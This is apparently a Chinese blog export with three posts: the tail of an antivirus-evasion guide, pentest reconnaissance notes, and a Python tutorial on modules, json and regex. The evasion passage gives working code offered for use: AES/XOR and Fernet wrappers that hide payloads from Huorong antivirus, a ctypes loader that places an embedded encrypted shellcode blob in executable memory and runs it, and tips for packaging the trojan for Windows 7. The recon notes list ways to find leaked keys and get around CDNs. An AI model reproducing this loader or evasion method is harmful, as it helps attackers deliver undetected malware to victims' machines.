<span class="keyword">return</span> <span class="built_in">str</span>.encode(s)  <span class="comment"># 返回bytes</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_jiami</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="comment"># 密钥长度必须为16、24或32位，分别对应AES-128、AES-192和AES-256</span></span><br><span class="line">    key = <span class="string">&#x27;LeslieCheungKwok&#x27;</span></span><br><span class="line">    aes = AES.new(add_to_16(key), AES.MODE_ECB)</span><br><span class="line">    encrypted_text = <span class="built_in">str</span>(base64.encodebytes(aes.encrypt(add_to_16(text))), encoding=<span class="string">&#x27;utf8&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> encrypted_text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_jiami</span>(<span class="params">s,key</span>):</span></span><br><span class="line">    xor_s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        xor_s += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ key)</span><br><span class="line">    <span class="keyword">return</span> xor_s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sc = <span class="string">&#x27;shellcode&#x27;</span><span class="comment">#读取shellcode</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./aes-xor.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(aes_jiami(xor_jiami(sc,<span class="number">35</span>)))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用fernet加密代码的脚本</span></span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"></span><br><span class="line"><span class="comment">#被火绒ban掉的代码</span></span><br><span class="line">ban_code=[<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xxxxxxxxx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">           ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> ban_code:</span><br><span class="line">   key =Fernet.generate_key()</span><br><span class="line">   f =Fernet(key)</span><br><span class="line">   enc_pay =f.encrypt(<span class="built_in">bytes</span>(code))</span><br><span class="line">   output_key =<span class="string">&quot;key= &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(key)</span><br><span class="line">   <span class="built_in">print</span>(output_key)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;f_obj= Fernet(key)&quot;</span>)</span><br><span class="line">   output_enc_pay =<span class="string">&quot;enc_pay= &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(enc_pay)</span><br><span class="line">   <span class="built_in">print</span>(output_enc_pay)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;exec(f_obj.decrypt(enc_pay))&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;========================================&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://pyob.oxyry.com/">Oxyry Python Obfuscator - The most reliable python obfuscator in the world</a></p>
<p>python代码混淆网址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#加载器</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">kernel32 = ctypes.windll.kernel32</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_jiemi</span>(<span class="params">s</span>):</span></span><br><span class="line">    cipher = AES.new(<span class="string">b&#x27;LeslieCheungKwok&#x27;</span>, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(base64.decodebytes(<span class="built_in">bytes</span>(s, encoding=<span class="string">&#x27;utf8&#x27;</span>))).rstrip(<span class="string">b&#x27;\0&#x27;</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_jiemi</span>(<span class="params">s,key</span>):</span></span><br><span class="line">    xor_s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        xor_s += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ key)</span><br><span class="line">    <span class="keyword">return</span> xor_s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_memory</span>(<span class="params">buf</span>):</span></span><br><span class="line">    length = <span class="built_in">len</span>(buf)</span><br><span class="line"></span><br><span class="line">    kernel32.VirtualAlloc.restype = ctypes.c_void_p</span><br><span class="line">    ptr = kernel32.VirtualAlloc(<span class="literal">None</span>, length, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">    kernel32.RtlMoveMemory.argtypes = (</span><br><span class="line">        ctypes.c_void_p,</span><br><span class="line">        ctypes.c_void_p,</span><br><span class="line">        ctypes.c_size_t)</span><br><span class="line">    kernel32.RtlMoveMemory(ptr, buf, length)</span><br><span class="line">    <span class="keyword">return</span> ptr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">shellcode</span>):</span></span><br><span class="line">    buf = ctypes.create_string_buffer(shellcode)</span><br><span class="line">    ptr = write_memory(buf)</span><br><span class="line">    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(<span class="literal">None</span>))</span><br><span class="line">    shell_func()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    jiami_sc = <span class="string">&#x27;nNTTwqBntRUVsGzFLXrB54mHCTMUkwOkgFGxbYPdb6zG2uKaUEKY4lK2dT36BaJQ9jZJ4rPVx5n0xGteS5M1f5r/hc9ab2ZAUcUipd/87CD/Vmns9lpZCaj8Cr1BXdsEpO56xJtpurJ9tbar8S+4VIX6cQ2bJefummMWD2tv8upIx8UtZigMvqryLrrQ6RN7Hab87ezQV9t9qtMBhKm2No3LA3mX/oYGWl88CBuMCqEEyntbFMKhbi8PXXDt+GvamHgmSlTPn+M54tLfoAbxy6L/MDId2TX+BrTjrbO53TNJODdgBl7Jn2SH2/ucg7VZpOoscbRSePFQo/+iCp4gqJn9h/alCY85EXuYti/14W7C41f0KSZfp0zPE5fI3lykyHWPVkZoX+LmdDg43pIybdaUgI/G1YLE9rK6o+9cBgr+BrQiehHpvl5Id8N6pKgilMIenPEwlCzEalny0uhKFVT6Kl9idOQZmds1kqLT0nyvem0lt+tffq3+a1ioGWGKybinrDOArR4P0GQrCjsoOAVWZlvuXceM7aZX1aGHEnfMNg7WQb1zfWRp3HCp1bKZ8IP+Fp3fKhpxNiHYAaGMqfBcZbIex1O6O6eg+xnNJ3TzOnQfhvfSMhtt3nzDe8OS5f1PtiMUUnOlXP8uYDlPDL6ZJxEIboziy9YdjsX0bM4A3FrDVlenTpK2wbWlOJnLEoxO7a6093Z6ILY3n201WNJR2bzvNFmBlRD0SvKPJpcB6nAR2pHjra27MNAqYq4oFingkte1G6UZBb2A3n3DyI2DgH9agOO1d4T1p0nYac4B2a/v+9NwmK1C4aQw1lOpqvQuyNS8OyFnGHZMmOkS+aYCR2bLc6vNrMVG7ys553D1mpKgi4vKvowXI/u0GoI/lSL9ehSAoMFaUdoieft2JpzVPRr1aF7JK5OAc6vnzLVASlnKCJb6Pj6MknFDJTruaW&#x27;</span></span><br><span class="line">    sc = xor_jiemi(aes_jiemi(jiami_sc),<span class="number">35</span>)</span><br><span class="line">    shde = base64.b64decode(sc)</span><br><span class="line">    run(shde)</span><br></pre></td></tr></table></figure>

<p>最后编译main就可</p>
<p>这套免杀就是base64+xor+aes最后代码混淆+fernet</p>
<p>最后我改了下里面的加密方式以及一些小东西，缝合了一套自己的免杀，源码我就在这不放了，免得用不了多久就没了。</p>
<p>最后说下踩的一个坑吧，win10打包的马在win7没法用怎么办，在win7装一个python32，然后在win7打包就行了，这样哪里都能运行，注意win7装python需要安装一个插件 KB976932补丁。</p>
]]></content>
      <categories>
        <category>-miansha</category>
      </categories>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/2022/01/30/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="渗透测试之信息收集"><a href="#渗透测试之信息收集" class="headerlink" title="渗透测试之信息收集"></a>渗透测试之信息收集</h1><h2 id="1-1收集域名信息"><a href="#1-1收集域名信息" class="headerlink" title="1.1收集域名信息"></a>1.1收集域名信息</h2><h3 id="1-1-1whois查询"><a href="#1-1-1whois查询" class="headerlink" title="1.1.1whois查询"></a>1.1.1whois查询</h3><p>简单的说whois就是一个用于查询域名是否已被注册一级注册域名的详细信息的数据库（如域名所有人，域名注册商）。</p>
<h3 id="1-1-2备案信息查询"><a href="#1-1-2备案信息查询" class="headerlink" title="1.1.2备案信息查询"></a>1.1.2备案信息查询</h3><p>icp备案查询网<a href="https://www.beianx.cn/">ICP备案查询网 (beianx.cn)</a></p>
<p>天眼查<a href="https://www.tianyancha.com/">天眼查-商业查询平台_企业信息查询_公司查询_工商查询_企业信用信息系统 (tianyancha.com)</a></p>
<h2 id="1-2收集敏感信息"><a href="#1-2收集敏感信息" class="headerlink" title="1.2收集敏感信息"></a>1.2收集敏感信息</h2><p>google语法，在我另外一篇博客中有。</p>
<p>burpsuiite的Repeater功能同样可以获取一些服务器的信息。</p>
<p>github上也可以找，类似数据库连接信息，邮箱密码，UC-KEY，阿里的osskey</p>
<h2 id="1-3收集子域名信息"><a href="#1-3收集子域名信息" class="headerlink" title="1.3收集子域名信息"></a>1.3收集子域名信息</h2><p><a href="https://phpinfo.me/domain">在线子域名查询 (phpinfo.me)</a></p>
<p><a href="https://dns.aizhan.com/1/">IP反查域名_同IP站点查询_同ip网站查询_爱站网 (aizhan.com)</a></p>
<h3 id="1-子域名检测工具"><a href="#1-子域名检测工具" class="headerlink" title="1.子域名检测工具"></a>1.子域名检测工具</h3><p>Layer子域名挖掘机，K8，wydomain等等</p>
<p>subDomainsBrute，可以用小字典递归发现三级域名或者四级域名。</p>
<h3 id="2-搜索引擎美剧"><a href="#2-搜索引擎美剧" class="headerlink" title="2.搜索引擎美剧"></a>2.搜索引擎美剧</h3><p>我们可以利用goolgle语法搜索。<code>site:baidu.com</code></p>
<h3 id="3-第三方聚合应用枚举"><a href="#3-第三方聚合应用枚举" class="headerlink" title="3.第三方聚合应用枚举"></a>3.第三方聚合应用枚举</h3><h4 id="DNSdumpster-com-dns-recon-and-research-find-and-lookup-dns-records（挂代理）"><a href="#DNSdumpster-com-dns-recon-and-research-find-and-lookup-dns-records（挂代理）" class="headerlink" title="DNSdumpster.com - dns recon and research, find and lookup dns records（挂代理）"></a><a href="https://dnsdumpster.com/">DNSdumpster.com - dns recon and research, find and lookup dns records</a>（挂代理）</h4><h3 id="4-证书透明度公开日志枚举"><a href="#4-证书透明度公开日志枚举" class="headerlink" title="4.证书透明度公开日志枚举"></a>4.证书透明度公开日志枚举</h3><h2 id="1-4收集常用端口信息-服务"><a href="#1-4收集常用端口信息-服务" class="headerlink" title="1.4收集常用端口信息/服务"></a>1.4收集常用端口信息/服务</h2><p>nmap，shodan等</p>
<p><img src="/2022/01/30/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/D68316B4F2D1CE7976D8A816A32F27CB.png" alt="img"><img src="/2022/01/30/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/28DA39F5B9F767E3C337844003F42EBE.png" alt="img"><img src="/2022/01/30/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/5F961E0C8CCC1DF6FC767A3AC4F1F95F.png" alt="img"></p>
<h2 id="1-5指纹识别"><a href="#1-5指纹识别" class="headerlink" title="1.5指纹识别"></a>1.5指纹识别</h2><p>找到一个与域名的cms指纹有助于我们后面的渗透工作。</p>
<p>一般在html,js,css文件中多多少少包含一些特征码。如index.php中有generator=wordpress3.xx</p>
<p>常见的cms有</p>
<p>dedecms（织梦），discuz，phpweb等</p>
<p>代表工具有御剑web指纹之别，WhatWeb，椰树等，可以快速识别一些主流的cms</p>
<p><a href="http://whatweb.bugscaner.com/">已支持识别的的cms列表,cms识别,源码识别,在线工具–BugScaner</a></p>
<p><a href="https://www.yunsee.cn/">云悉互联网WEB资产在线梳理|在线CMS指纹识别平台 - 云悉安全平台 (yunsee.cn)</a></p>
<p><a href="https://www.whatweb.net/">WhatWeb - Next generation web scanner.</a></p>
<h2 id="1-6查找真实ip"><a href="#1-6查找真实ip" class="headerlink" title="1.6查找真实ip"></a>1.6查找真实ip</h2><p>用超极ping</p>
<p>如果有cdn我们就需要绕过cdn寻找目标的真实ip</p>
<p>内部邮箱源，扫描网站测试文件，分站域名，国外访问，查询域名的解析记录（查看历史ip），</p>
<p>如果网站有自己的app，我们可以通过抓包来看真实ip。</p>
<p>绕过cloudflare，现在很多网站都使用cloudflare，我们可以先尝试通过在线网站cloudflarewatch来查询。</p>
<h2 id="1-7收集敏感文件目录"><a href="#1-7收集敏感文件目录" class="headerlink" title="1.7收集敏感文件目录"></a>1.7收集敏感文件目录</h2><p>我们可以用DirBuseter，wwwsan轻量级扫描。</p>
<p>或者用市面上的一些工具来扫。</p>
<h2 id="1-8社会工程学"><a href="#1-8社会工程学" class="headerlink" title="1.8社会工程学"></a>1.8社会工程学</h2><p>通过管理员的邮箱找到真实ip等用法，建议还是看下社工的书。</p>
<h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>八、学习py：模块</title>
    <url>/2022/01/08/%E5%85%AB%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h1 id="模块-正则表达式"><a href="#模块-正则表达式" class="headerlink" title="模块 正则表达式"></a>模块 正则表达式</h1><h2 id="1-自定义模块"><a href="#1-自定义模块" class="headerlink" title="1.自定义模块"></a>1.自定义模块</h2><h3 id="1-1模块和包"><a href="#1-1模块和包" class="headerlink" title="1.1模块和包"></a>1.1模块和包</h3><p>由于所有函数都定义在一个文件中会大大降低这段代码的可读性，所以可以将函数定义在其他的文件中，再使用from import 关键字来调用。其中相关的功能。</p>
<p>包，一般指存放模块的文件夹。</p>
<p>模块，一般指存放功能函数的py文件。</p>
<h3 id="1-2导入（路径相关）"><a href="#1-2导入（路径相关）" class="headerlink" title="1.2导入（路径相关）"></a>1.2导入（路径相关）</h3><p>当定义好一个模块和包之后，用from 文件路径 import 函数 来导入文件。</p>
<p>python在找模块时，只会去几个指定的路径寻找。</p>
<p>也可以自动手动在sys.path中添加指定路径，然后再导入就可以，例如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">&quot;路径a&quot;</span>)</span><br><span class="line"></span><br><span class="line">improt xxx</span><br></pre></td></tr></table></figure>

<h2 id="2-第三方模块"><a href="#2-第三方模块" class="headerlink" title="2.第三方模块"></a>2.第三方模块</h2><h3 id="1-pip（最常用）"><a href="#1-pip（最常用）" class="headerlink" title="1.pip（最常用）"></a>1.pip（最常用）</h3><p>这是python中最最最常用的安装第三方模块的方式，pip其实是一个第三方模块包管理工具，默认安装python解释器是自动会安装。</p>
<p>使用pip全装第三方模块也非常简单，只需要在自己终端执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install 模块名称</span><br></pre></td></tr></table></figure>

<p>即可。</p>
<h2 id="3-内置模块"><a href="#3-内置模块" class="headerlink" title="3.内置模块"></a>3.内置模块</h2><p>python内置的模块有很多，我们也接触了不少相关的模块，接下来我们就来做一些汇总和介绍。</p>
<p><a href="https://blog.csdn.net/ruanxingzi123/article/details/82787852">(29条消息) python 常用的内置模块_一起学习-CSDN博客_python内置模块</a></p>
<p>常见的就自己查文章拉啦，这里讲一些其他的。</p>
<h3 id="3-1json"><a href="#3-1json" class="headerlink" title="3.1json"></a>3.1json</h3><p>json模块，可以将python的数据格式转化为json格式的数据，也可以将json格式的数据也可以转换成python格式的数据。</p>
<p>json格式，是一个数据格式（本质上就是个字符串，常用于网络数据传输。）</p>
<h4 id="3-1-1核心功能"><a href="#3-1-1核心功能" class="headerlink" title="3.1.1核心功能"></a>3.1.1核心功能</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">跨语言数据的传输，例如</span><br><span class="line">A系统用python开发</span><br><span class="line">B用java开发</span><br><span class="line">语言不通基础数据类型格式都不同，</span><br><span class="line">为了方便数据传输，大家约定一个格式，json格式，每种语言都是将自己的数据类型转换为json格式然后再转换为其他的语言的数据类型。</span><br></pre></td></tr></table></figure>



<p>Python与json格式的相互转换：</p>
<p>数据类型-&gt;json，一般称为：序列化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">data = [</span><br><span class="line">    &#123;<span class="string">&quot;id&quot;</span>:<span class="number">1</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;dhk&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">123</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;id&quot;</span>:<span class="number">2</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;动肝&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">312</span>&#125;</span><br><span class="line">]</span><br><span class="line">res = json.dumps(data)</span><br><span class="line"><span class="built_in">print</span>(res)<span class="comment">#[&#123;&quot;id&quot;: 1, &quot;name&quot;: &quot;dhk&quot;, &quot;age&quot;: 123&#125;, &#123;&quot;id&quot;: 2, &quot;name&quot;: &quot;\u52a8\u809d&quot;, &quot;age&quot;: 312&#125;]</span></span><br><span class="line"></span><br><span class="line">res = json.dumps(data,ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment">#[&#123;&quot;id&quot;: 1, &quot;name&quot;: &quot;dhk&quot;, &quot;age&quot;: 123&#125;, &#123;&quot;id&quot;: 2, &quot;name&quot;: &quot;动肝&quot;, &quot;age&quot;: 312&#125;]</span></span><br></pre></td></tr></table></figure>

<p>json-&gt;python数据类型，一般称为：发序列化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json </span><br><span class="line">data_string = <span class="string">&#x27;[&#123;&quot;id&quot;: 1, &quot;name&quot;: &quot;dhk&quot;, &quot;age&quot;: 123&#125;, &#123;&quot;id&quot;: 2, &quot;name&quot;: &quot;动肝&quot;, &quot;age&quot;: 312&#125;]&#x27;</span></span><br><span class="line">data_list = json.loads(data_string)</span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[&#123;&#x27;id&#x27;: 1, &#x27;name&#x27;: &#x27;dhk&#x27;, &#x27;age&#x27;: 123&#125;, &#123;&#x27;id&#x27;: 2, &#x27;name&#x27;: &#x27;动肝&#x27;, &#x27;age&#x27;: 312&#125;]</span></span><br></pre></td></tr></table></figure>

<p>小例子：</p>
<p>写一个网站，给用户返回json数据格式</p>
<p>使用flask写个网站</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;首页&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span>():</span></span><br><span class="line">    data = [</span><br><span class="line">        &#123;<span class="string">&quot;id&quot;</span>: <span class="number">1</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;dhk&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">123</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;id&quot;</span>: <span class="number">2</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;动肝&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">312</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> json.dumps(data)</span><br><span class="line"></span><br><span class="line">app.add_url_rule(<span class="string">&#x27;/index/&#x27;</span>,view_func=index,endpoint=<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">app.add_url_rule(<span class="string">&#x27;/user/&#x27;</span>,view_func=user,endpoint=<span class="string">&#x27;user&#x27;</span>)<span class="comment">#用户在地址栏输入user执行user函数。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>2.写个爬虫把这个数据给爬到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000/user/&quot;</span></span><br><span class="line">res = requests.get(url)</span><br><span class="line">reslut = json.dumps(res.text)<span class="comment">#反序列化</span></span><br><span class="line"><span class="built_in">print</span>(reslut)</span><br></pre></td></tr></table></figure>

<h4 id="3-1-2类型要求"><a href="#3-1-2类型要求" class="headerlink" title="3.1.2类型要求"></a>3.1.2类型要求</h4><p>python的数据类型转换为json格式，对数据类型是有要求的：</p>
<p><img src="/2022/01/08/%E5%85%AB%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E6%A8%A1%E5%9D%97/image-20220104153252331.png" alt="image-20220104153252331"></p>
<h3 id="3-2时间处理"><a href="#3-2时间处理" class="headerlink" title="3.2时间处理"></a>3.2时间处理</h3><p>UTC/GMT：世界时间</p>
<p>本地时间：本地时区的时间</p>
<p>python中关于时间处理的模块有两个，分别是time和datetime</p>
<h4 id="3-2-1time"><a href="#3-2-1time" class="headerlink" title="3.2.1time"></a>3.2.1time</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line">v1 = time.time()<span class="comment">#本时区的时间戳</span></span><br><span class="line"><span class="built_in">print</span>(v1)</span><br><span class="line"></span><br><span class="line">v2 = time.timezone</span><br><span class="line"><span class="built_in">print</span>(v2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)<span class="comment">#延时三秒钟再执行</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="3-2-2datetime"><a href="#3-2-2datetime" class="headerlink" title="3.2.2datetime"></a>3.2.2datetime</h4><p>平时开发过程的时间一般以如下三种格式存在：</p>
<p>datetime</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime,timezone,timedelta</span><br><span class="line">v1 = datetime.now()<span class="comment">#当前本地时间</span></span><br><span class="line"><span class="built_in">print</span>(v1)<span class="comment">#2022-01-04 15:51:24.055927</span></span><br><span class="line"></span><br><span class="line">v2 = datetime.utcnow()<span class="comment">#utc当前时间</span></span><br><span class="line"><span class="built_in">print</span>(v2)</span><br><span class="line"></span><br><span class="line">tz = time(timedelte(hours=<span class="number">7</span>))<span class="comment">#当前东七区</span></span><br><span class="line">v2 = datetime.now(tz)</span><br><span class="line"><span class="built_in">print</span>(v2)</span><br></pre></td></tr></table></figure>

<p>字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#字符串格式的时间 转换为datetime格式时间</span></span><br><span class="line">text = <span class="string">&quot;2021-11-11&quot;</span></span><br><span class="line">v1 = datetime.strptime(text,<span class="string">&quot;%Y-%m-%d&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(v1)<span class="comment">#2021-11-11 00:00:00</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#datetime格式 转换为字符串</span></span><br><span class="line">v1 = datetime.now</span><br><span class="line">val = v1.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(val)</span><br></pre></td></tr></table></figure>

<h2 id="4-正则表达式相关"><a href="#4-正则表达式相关" class="headerlink" title="4.正则表达式相关"></a>4.正则表达式相关</h2><p>当给你一大堆文本信息，让你提取其中的指定数据时，可以使用正则来实现。例如：提取文本中的邮箱和手机号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;太厉害了，给我一份资源吧！我的邮箱号是123456789@qq.com和dhk@live.com,这是我的手机号12312312315!&quot;</span></span><br><span class="line">phone_list = re.findall(<span class="string">&quot;1[2|3|5]\d&#123;9&#125;&quot;</span>,text)</span><br><span class="line"><span class="built_in">print</span>(phone_list)<span class="comment">#[&#x27;12312312315&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>正则表达式并不是只属于python，在其他语言中同样存在。</p>
<h3 id="4-1正则表达式"><a href="#4-1正则表达式" class="headerlink" title="4.1正则表达式"></a>4.1正则表达式</h3><h4 id="4-1-1字符相关"><a href="#4-1-1字符相关" class="headerlink" title="4.1.1字符相关"></a>4.1.1字符相关</h4><p>1.dhk 匹配文本中的dhk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;你好啊dhk，我知道其实你dhk是一个joker，但是身为joker的dhk是不能暴露身份的，&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;dhk&quot;</span>,text)</span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[&#x27;dhk&#x27;, &#x27;dhk&#x27;, &#x27;dhk&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>2.[dhk]匹配d或h或k</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;你好啊dhk，我知道其实你dhk是一个joker，但是身为joker的dhk是不能暴露身份的，&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;[dhk]&quot;</span>,text)</span><br><span class="line"><span class="built_in">print</span>(data_list)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[&#x27;d&#x27;, &#x27;h&#x27;, &#x27;k&#x27;, &#x27;d&#x27;, &#x27;h&#x27;, &#x27;k&#x27;, &#x27;k&#x27;, &#x27;k&#x27;, &#x27;d&#x27;, &#x27;h&#x27;, &#x27;k&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;你好啊dhk，我知道其实你dhk是一个joker，但是身为joker的dhk是不能暴露身份的，&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;d[hk]&quot;</span>,text)<span class="comment">#q开头的字符串，后面的内容只能是h或者是k</span></span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[&#x27;dh&#x27;, &#x27;dh&#x27;, &#x27;dh&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>3.<img src="/2022/01/08/%E5%85%AB%E3%80%81%E5%AD%A6%E4%B9%A0py%EF%BC%9A%E6%A8%A1%E5%9D%97/Users\wanheiqiyihu\AppData\Roaming\Typora\typora-user-images\image-20220104175556760.png" alt="image-20220104175556760">匹配除了abc以外的字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;你好啊dhk，我知道其实你dhk是一个joker，但是身为joker的dhk是不能暴露身份的，&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;[^dhkj]&quot;</span>,text)</span><br><span class="line"><span class="built_in">print</span>(data_list)</span><br></pre></td></tr></table></figure>

<p>4.[a-z]匹配a~z的任意字符，（[0-9]也可以）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">text = <span class="string">&quot;你好啊dhk，我知道其实你dhk是一个joker，但是身为joker的dhk是不能暴露身份的，&quot;</span></span><br><span class="line">data_list = re.findall(<span class="string">&quot;[d-e]&quot;</span>,text)</span><br><span class="line"><span class="built_in">print</span>(data_list)<span class="comment">#[&#x27;d&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;e&#x27;, &#x27;d&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>5.”.”代指出换行符以外的任意字符</p>
